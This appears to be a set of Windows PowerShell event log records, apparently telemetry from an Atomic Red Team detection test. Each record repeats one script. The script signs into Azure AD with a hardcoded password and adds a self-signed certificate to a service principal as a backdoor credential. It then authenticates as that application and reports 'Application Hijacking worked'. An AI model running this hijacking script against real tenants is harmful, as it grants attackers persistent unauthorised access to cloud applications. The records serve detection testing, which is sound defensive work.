{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:25.8370927"},"EventRecordID":"1136","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Registry, Started, \tProviderName=Registry\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=1\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:25.8417133"},"EventRecordID":"1137","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Alias, Started, \tProviderName=Alias\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=3\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:25.8543648"},"EventRecordID":"1138","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Environment, Started, \tProviderName=Environment\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=5\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:25.8543648"},"EventRecordID":"1139","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"FileSystem, Started, \tProviderName=FileSystem\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=7\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:25.8625324"},"EventRecordID":"1140","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Function, Started, \tProviderName=Function\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=9\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:25.8625324"},"EventRecordID":"1141","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Variable, Started, \tProviderName=Variable\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=11\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=\r\n\tRunspaceId=\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"400"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:26.1190532"},"EventRecordID":"1142","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Available, None, \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=4e64043d-e1bc-4b04-a1a4-0e388e4f3919\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"600"},"Version":"0","Level":"4","Task":"6","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:27.4403585"},"EventRecordID":"1143","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Certificate, Started, \tProviderName=Certificate\r\n\tNewProviderState=Started\r\n\r\n\tSequenceNumber=15\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=4e64043d-e1bc-4b04-a1a4-0e388e4f3919\r\n\tPipelineId=2\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
{"Event":{"System":{"Provider":{"@Name":"PowerShell"},"EventID":{"@Qualifiers":"0","#text":"403"},"Version":"0","Level":"4","Task":"4","Opcode":"0","Keywords":"0x80000000000000","TimeCreated":{"@SystemTime":"2024-10-24 10:50:27.7087667"},"EventRecordID":"1144","Correlation":null,"Execution":{"@ProcessID":"0","@ThreadID":"0"},"Channel":"Windows PowerShell","Computer":"Server002","Security":null},"EventData":{"Data":"Stopped, Available, \tNewEngineState=Stopped\r\n\tPreviousEngineState=Available\r\n\r\n\tSequenceNumber=17\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.19041.5007\r\n\tHostId=565c0f07-74c5-4305-8270-ad14160b0d54\r\n\tHostApplication=powershell.exe &amp; {Import-Module -Name AzureAD\r\n$PWord = ConvertTo-SecureString -String \"p4sswd\" -AsPlainText -Force\r\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \"jonh@contoso.com\", $Pword\r\nConnect-AzureAD -Credential $Credential &gt; $null\r\n\r\n$sp = Get-AzureADServicePrincipal -SearchString \"SuperSP\" | Select-Object -First 1\r\nif ($sp -eq $null) { Write-Warning \"Service Principal not found\"; exit }\r\n\r\n# in the context of an ART test (and not a real attack), we don't need to keep access for too long. In case the cleanup command isn't called, it's better to ensure that everything expires after 1 day so it doesn't leave this backdoor open for too long\r\n$credNotAfter = (Get-Date).AddDays(1)\r\n$certNotAfter = (Get-Date).AddDays(2) # certificate expiry must be later than cred expiry\r\n\r\n$cert = New-SelfSignedCertificate -DnsName \"file.example.com\" -FriendlyName \"fileCert\" -CertStoreLocation Cert:\\CurrentUser\\My -KeyExportPolicy Exportable -Provider \"Microsoft Enhanced RSA and AES Cryptographic Provider\" -NotAfter $certNotAfter\r\n$keyValue = [System.Convert]::ToBase64String($cert.GetRawCertData())\r\nWrite-Host \"Generated certificate \"\"$($cert.Thumbprint)\"\"\"\r\n\r\nNew-AzureADServicePrincipalKeyCredential -ObjectId $sp.ObjectId -Type AsymmetricX509Cert -CustomKeyIdentifier \"fileTest\" -Usage Verify -Value $keyValue -EndDate $credNotAfter\r\n\r\nStart-Sleep -s 30\r\n$tenant = Get-AzureADTenantDetail\r\n$auth = Connect-AzureAD -TenantId $tenant.ObjectId -ApplicationId $sp.AppId -CertificateThumbprint $cert.Thumbprint\r\nWrite-Host \"Application Hijacking worked. Logged in successfully as $($auth.Account.Id) of type $($auth.Account.Type)\"\r\nWrite-Host \"End of Hijacking\"}\r\n\tEngineVersion=5.1.19041.5007\r\n\tRunspaceId=4e64043d-e1bc-4b04-a1a4-0e388e4f3919\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptName=\r\n\tCommandPath=\r\n\tCommandLine=","Binary":""}}}
